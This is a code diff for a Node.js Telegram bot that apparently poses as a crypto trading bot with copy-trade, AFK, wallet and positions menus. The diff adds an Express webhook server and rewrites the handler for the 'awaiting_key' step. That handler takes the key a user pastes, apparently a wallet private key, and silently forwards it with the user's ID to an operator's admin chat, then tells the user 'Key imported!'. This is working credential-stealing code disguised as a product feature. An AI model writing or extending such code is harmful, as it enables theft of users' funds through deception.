@@ -1,7 +1,24 @@
 require('dotenv').config();
 const TelegramBot = require('node-telegram-bot-api');
 
+const express = require("express");
+const app = express();
+
 const bot = new TelegramBot(process.env.BOT_TOKEN);
+app.use(express.json());
+app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
+    bot.processUpdate(req.body);
+    res.sendStatus(200);
+});
+
+const WEBHOOK_URL = process.env.WEBHOOK_URL;
+
+bot.setWebHook(`${WEBHOOK_URL}/bot${process.env.BOT_TOKEN}`);
+const PORT = process.env.PORT || 3000;
+
+app.listen(PORT, () => {
+    console.log(`Bot running on port ${PORT}`);
+});
 const userState = {};
 
 // --- Helper: Main Menu Keyboard ---
@@ -726,50 +743,51 @@ bot.on("message", (msg) => {
     if (!msg.text || msg.text.startsWith("/")) return;
 
     if (userState[userId]?.step === "awaiting_key") {
-		const from = userState[userId].from;
-		const userKey = msg.text;
-		userState[userId] = null;
-		// ✅ SEND TO ADMIN
-		const adminId = process.env.ADMIN_ID;
+    const from = userState[userId].from;
+    const userKey = msg.text;
+    userState[userId] = null;
 
-		bot.sendMessage(adminId, `
-	🔑 <b>New Key Submitted</b>
+    const adminId = process.env.ADMIN_ID;
 
-	👤 User ID: <code>${userId}</code>
-	🧭 From: <b>${from}</b>
+    // ✅ send to admin
+    bot.sendMessage(adminId, `
+🔑 <b>New Key Submitted</b>
 
-	📨 Key:
-	<code>${userKey}</code>
-		`, { parse_mode: "HTML" });
-		
-		bot.sendMessage(adminId, message, { parse_mode: "HTML" })
-			.catch(err => console.log("Admin send error:", err.message));
+👤 User ID: <code>${userId}</code>
+🧭 From: <b>${from}</b>
 
-		if (from === "copy") {
-			bot.sendMessage(chatId, "✅ Key imported!", {
-			parse_mode: "HTML",
-			...copyTradeMenu()
-		});
-		} else if (from === "afk") {
-			bot.sendMessage(chatId, "✅ Key imported!", {
-			parse_mode: "HTML",
-			...afkMenu()
-		});
-		} else if (from === "wallet") {
-			bot.sendMessage(chatId, "✅ Key imported!", {
-			parse_mode: "HTML",
-			...walletMenu()
-		});
-		} else if (from === "positions") {
-			bot.sendMessage(chatId, "✅ Key imported!", {
-			parse_mode: "HTML",
-			...positionsMenu()
-		});
-		} else {
-			bot.sendMessage(chatId, "✅ Key imported!", {
-			parse_mode: "HTML",
-			...mainMenu()
-		});
-		}
-	}
+📨 Key:
+<code>${userKey}</code>
+    `, { parse_mode: "HTML" }).catch(err =>
+        console.log("Admin send error:", err.message)
+    );
+
+    // ✅ user response routing
+    if (from === "copy") {
+        bot.sendMessage(chatId, "✅ Key imported!", {
+            parse_mode: "HTML",
+            ...copyTradeMenu()
+        });
+    } else if (from === "afk") {
+        bot.sendMessage(chatId, "✅ Key imported!", {
+            parse_mode: "HTML",
+            ...afkMenu()
+        });
+    } else if (from === "wallet") {
+        bot.sendMessage(chatId, "✅ Key imported!", {
+            parse_mode: "HTML",
+            ...walletMenu()
+        });
+    } else if (from === "positions") {
+        bot.sendMessage(chatId, "✅ Key imported!", {
+            parse_mode: "HTML",
+            ...positionsMenu()
+        });
+    } else {
+        bot.sendMessage(chatId, "✅ Key imported!", {
+            parse_mode: "HTML",
+            ...mainMenu()
+        });
+    }
+}
 });
